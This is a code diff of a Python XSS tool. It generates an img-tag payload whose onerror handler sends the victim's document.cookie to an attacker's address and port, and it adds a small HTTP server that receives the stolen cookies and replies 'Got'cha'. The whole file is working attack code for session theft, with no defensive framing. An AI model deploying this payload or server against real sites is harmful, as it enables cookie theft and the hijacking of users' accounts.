@@ -4,12 +4,34 @@ import util
 import sys
 import http.server
 import socketserver
+from http.server import HTTPServer, BaseHTTPRequestHandler
 
 def generatePayload(type, address, port):
     if type == "img":
         return '<img src="#" onerror="javascript:document.location=\'http://%s:%d/?x=\'+document.cookie">' % (address, port)
     else:
         return None
+
+class XssServer(BaseHTTPRequestHandler):
+    def _set_headers(self):
+        self.send_response(200)
+        self.send_header("Content-type", "text/html")
+        self.end_headers()
+
+    def _html(self):
+        content = f"<html><body><h1>Got'cha</h1></body></html>"
+        return content.encode("utf8")  # NOTE: must return a bytes object!
+
+    def do_GET(self):
+        self._set_headers()
+        self.wfile.write(self._html())
+
+    def do_HEAD(self):
+        self._set_headers()
+
+    def do_POST(self):
+        self._set_headers()
+        self.wfile.write(self._html())
 
 if __name__ == "__main__":
 
@@ -39,7 +61,6 @@ if __name__ == "__main__":
     print(payload)
     print()
 
-    Handler = http.server.SimpleHTTPRequestHandler
-    with socketserver.TCPServer((local_address, listen_port), Handler) as httpd:
-        print("serving at port", listen_port)
-        httpd.serve_forever()
+    httpd = HTTPServer((local_address, listen_port), XssServer)
+    print(f"Starting httpd server on {local_address}:{listen_port}")
+    httpd.serve_forever()
